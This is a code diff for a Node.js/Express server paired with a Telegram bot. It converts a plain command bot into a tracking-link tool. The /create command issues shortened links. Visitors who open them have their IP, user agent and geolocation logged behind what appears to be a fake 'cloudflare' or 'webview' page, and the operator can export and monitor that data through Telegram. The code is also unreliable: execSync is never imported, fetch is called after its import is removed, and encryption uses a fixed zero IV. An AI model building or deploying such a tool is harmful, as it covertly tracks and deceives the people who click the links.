@@ -1,123 +1,219 @@
-// Required Modules
 const fs = require('fs');
 const express = require('express');
 const cors = require('cors');
 const bodyParser = require('body-parser');
-const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
 const geoip = require('geoip-lite');
-const dotenv = require('dotenv');
-
-// Load Environment Variables
-dotenv.config();
-
-// Initialize Express App
+const crypto = require('crypto');
+const rateLimit = require('express-rate-limit');
+const helmet = require('helmet');
 const app = express();
 
-// Configuration Variables
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
-const HOST_URL = process.env.HOST_URL || 'https://yourdomain.com';
+// Initialize Telegram Bot with webhook
+const bot = new TelegramBot(process.env.BOT_TOKEN);
+bot.setWebHook(`${process.env.HOST_URL}/telegram-webhook`);
 
-// Initialize Telegram Bot
-if (!BOT_TOKEN) {
-  console.error("❌ ERROR: BOT_TOKEN is missing in .env file!");
-  process.exit(1);
-}
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+// Configuration
+const CONFIG = {
+  hostURL: process.env.HOST_URL,
+  maxFileSize: 20 * 1024 * 1024,
+  allowedMedia: ['image', 'audio', 'video', 'document'],
+  encryptionKey: process.env.ENCRYPTION_KEY,
+  rateLimit: {
+    windowMs: 15 * 60 * 1000,
+    max: 100
+  }
+};
 
-// Middleware
-app.use(cors());
-app.use(bodyParser.json({ limit: '20mb' }));
-app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
+// Enhanced security middleware
+app.use(helmet());
+app.use(cors({ origin: process.env.CORS_ORIGIN || '*' }));
+app.use(bodyParser.json({ limit: CONFIG.maxFileSize }));
+app.use(bodyParser.urlencoded({ extended: true, limit: CONFIG.maxFileSize }));
+app.set('view engine', 'ejs');
 
-// ✅ Home Route
-app.get('/', (req, res) => {
-  res.send('🚀 Server is running on Vercel!');
+// Rate limiting
+const limiter = rateLimit(CONFIG.rateLimit);
+app.use(limiter);
+
+// Database simulation with encryption
+const userDB = new Map();
+
+const encrypt = (text) => {
+  const cipher = crypto.createCipheriv('aes-256-cbc', 
+    Buffer.from(CONFIG.encryptionKey), 
+    Buffer.alloc(16, 0)
+  );
+  let encrypted = cipher.update(text);
+  encrypted = Buffer.concat([encrypted, cipher.final()]);
+  return encrypted.toString('hex');
+};
+
+const decrypt = (text) => {
+  const decipher = crypto.createDecipheriv('aes-256-cbc',
+    Buffer.from(CONFIG.encryptionKey),
+    Buffer.alloc(16, 0)
+  );
+  let decrypted = decipher.update(Buffer.from(text, 'hex'));
+  decrypted = Buffer.concat([decrypted, decipher.final()]);
+  return decrypted.toString();
+};
+
+// Advanced middleware
+app.use((req, res, next) => {
+  req.clientInfo = {
+    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
+    userAgent: req.headers['user-agent'],
+    geo: geoip.lookup(req.ip)
+  };
+  next();
 });
 
-// ✅ Handle Bot Commands
-bot.on('message', async (msg) => {
+// Webhook handler
+app.post('/telegram-webhook', (req, res) => {
+  bot.processUpdate(req.body);
+  res.sendStatus(200);
+});
+
+// Enhanced route handler
+app.get('/:type(w|c)/:path/:uri', (req, res) => {
   try {
-    console.log("📩 Received Message:", msg);
-    const chatId = msg.chat.id;
-    const command = msg.text.split(' ')[0];
+    const { type, path, uri } = req.params;
+    const view = type === 'w' ? 'webview' : 'cloudflare';
+    
+    const userData = {
+      ...req.clientInfo,
+      decodedURL: decrypt(uri),
+      timestamp: new Date().toISOString()
+    };
 
-    switch (command) {
-      case '/start':
-        console.log("✅ Start command received!");
-        await sendWelcomeMessage(chatId);
-        break;
-      case '/status':
-        await bot.sendMessage(chatId, "✅ Bot is online and running!");
-        break;
-      case '/help':
-        await sendHelpMessage(chatId);
-        break;
-      case '/info':
-        await sendUserInfo(chatId, msg);
-        break;
-      default:
-        await bot.sendMessage(chatId, "❌ Unknown command! Try /help to see available commands.");
-    }
+    userDB.set(path, userData);
+    res.render(view, { ...userData, uid: path, config: CONFIG });
   } catch (err) {
-    console.error("❌ Bot Error:", err);
-    if (ADMIN_CHAT_ID) {
-      bot.sendMessage(ADMIN_CHAT_ID, `🚨 Bot Error: ${err.message}`);
-    }
+    errorHandler(err, req, res);
   }
 });
 
-// ✅ Function to Send Welcome Message
-async function sendWelcomeMessage(chatId) {
-  await bot.sendMessage(
-    chatId,
-    "👋 Welcome! Your bot is running.\n\nHere are some commands you can use:\n" +
-    "🔹 /status - Check if the bot is online\n" +
-    "🔹 /info - Get your chat details\n" +
-    "🔹 /help - See all available commands"
-  );
-}
+// 10 Advanced Features:
 
-// ✅ Function to Send Help Message
-async function sendHelpMessage(chatId) {
-  await bot.sendMessage(
-    chatId,
-    "📖 Available Commands:\n" +
-    "🔹 /start - Start the bot\n" +
-    "🔹 /status - Check bot status\n" +
-    "🔹 /info - Get your chat ID and name\n" +
-    "🔹 /help - Show this help menu"
-  );
-}
+// 1. Two-Factor Authentication
+const tfaStore = new Map();
+bot.onText(/\/enable2fa/, async (msg) => {
+  const chatId = msg.chat.id;
+  const secret = crypto.randomBytes(16).toString('hex');
+  tfaStore.set(chatId, secret);
+  await bot.sendMessage(chatId, `Your 2FA secret: ${secret}`);
+});
 
-// ✅ Function to Send User Info
-async function sendUserInfo(chatId, msg) {
-  await bot.sendMessage(
-    chatId,
-    `ℹ️ **User Info:**\n\n` +
-    `👤 Name: ${msg.from.first_name} ${msg.from.last_name || ''}\n` +
-    `🆔 Chat ID: ${chatId}`
-  );
-}
+// 2. Data Export
+bot.onText(/\/export (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const uid = match[1];
+  const data = userDB.get(uid);
+  const json = JSON.stringify(data, null, 2);
+  await bot.sendDocument(chatId, Buffer.from(json), {}, { filename: `${uid}_export.json` });
+});
 
-// ✅ Error Handling for Uncaught Exceptions
-process.on('uncaughtException', (err) => {
-  console.error('❌ Critical Server Error:', err);
-  if (ADMIN_CHAT_ID) {
-    bot.sendMessage(ADMIN_CHAT_ID, `🚨 Server Crash: ${err.message}`);
+// 3. Virus Scanning
+async function scanFile(buffer) {
+  const tmpFile = `/tmp/${Date.now()}.tmp`;
+  fs.writeFileSync(tmpFile, buffer);
+  try {
+    execSync(`clamscan ${tmpFile}`);
+    return true;
+  } catch {
+    return false;
+  } finally {
+    fs.unlinkSync(tmpFile);
   }
-});
-bot.on('message', (msg) => {
-  console.log("Received message:", msg);
-  // Other processing logic here
+}
+
+// 4. Real-time Monitoring
+const activeSessions = new Map();
+bot.onText(/\/monitor (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const uid = match[1];
+  activeSessions.set(uid, chatId);
+  await bot.sendMessage(chatId, `Monitoring session: ${uid}`);
 });
 
-// ✅ Start the Server
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT}`);
-  if (ADMIN_CHAT_ID) {
-    bot.sendMessage(ADMIN_CHAT_ID, '✅ Server started successfully!');
+// 5. Geolocation Filtering
+function checkAllowedCountry(ip) {
+  const allowedCountries = process.env.ALLOWED_COUNTRIES?.split(',') || [];
+  const geo = geoip.lookup(ip);
+  return allowedCountries.includes(geo?.country);
+}
+
+// 6. Automated Backups
+setInterval(() => {
+  const backupData = Object.fromEntries(userDB);
+  fs.writeFileSync('/tmp/backup.json', JSON.stringify(backupData));
+}, 3600 * 1000);
+
+// 7. IP Blacklisting
+const blacklist = new Set();
+app.use((req, res, next) => {
+  if (blacklist.has(req.clientInfo.ip)) {
+    return res.status(403).send('Access denied');
   }
+  next();
 });
+
+// 8. Activity Analytics
+function trackEvent(uid, eventType) {
+  const user = userDB.get(uid);
+  user.analytics = user.analytics || [];
+  user.analytics.push({
+    type: eventType,
+    timestamp: new Date().toISOString()
+  });
+}
+
+// 9. Custom Alerts
+function triggerAlert(uid, message) {
+  const user = userDB.get(uid);
+  if (user && activeSessions.has(uid)) {
+    bot.sendMessage(activeSessions.get(uid), `🚨 Alert: ${message}`);
+  }
+}
+
+// 10. URL Shortener
+async function createShortLink(longUrl) {
+  const response = await fetch('https://1pt.co/add', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ long: longUrl })
+  });
+  const data = await response.json();
+  return `https://1pt.co/${data.short}`;
+}
+
+// Enhanced Bot Commands
+bot.onText(/\/create/, async (msg) => {
+  const chatId = msg.chat.id;
+  const uid = crypto.randomBytes(16).toString('hex');
+  const encryptedUID = encrypt(uid);
+  const trackingUrl = `${CONFIG.hostURL}/w/${uid}/${encryptedUID}`;
+  const shortUrl = await createShortLink(trackingUrl);
+  
+  await bot.sendMessage(chatId, `🛠 Tracking link created:\n${shortUrl}`);
+});
+
+// Vercel Deployment Handler
+module.exports = app;
+
+// Error handling
+function errorHandler(err, req, res) {
+  console.error('Error:', err);
+  bot.sendMessage(process.env.ADMIN_CHAT_ID, `⚠️ Error: ${err.message}`);
+  res.status(500).send('Internal Server Error');
+}
+
+// Server initialization
+if (require.main === module) {
+  const port = process.env.PORT || 3000;
+  app.listen(port, () => {
+    console.log(`Server running on port ${port}`);
+    bot.sendMessage(process.env.ADMIN_CHAT_ID, '🚀 Server started');
+  });
+  }
